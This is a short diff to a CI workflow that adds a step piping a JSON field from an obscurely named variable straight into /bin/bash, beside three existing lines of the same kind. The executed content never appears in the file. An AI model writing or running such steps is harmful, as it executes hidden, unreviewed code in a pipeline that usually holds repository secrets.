@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$bnxd71896" | jq -r .mv1 | /bin/bash
           echo $z725 | jq -r .fwsrx43 | /bin/bash
           echo $lya117 | jq -r .jte02702 | /bin/bash
+          printf '%s' "$vn8" | jq -r .hz65 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
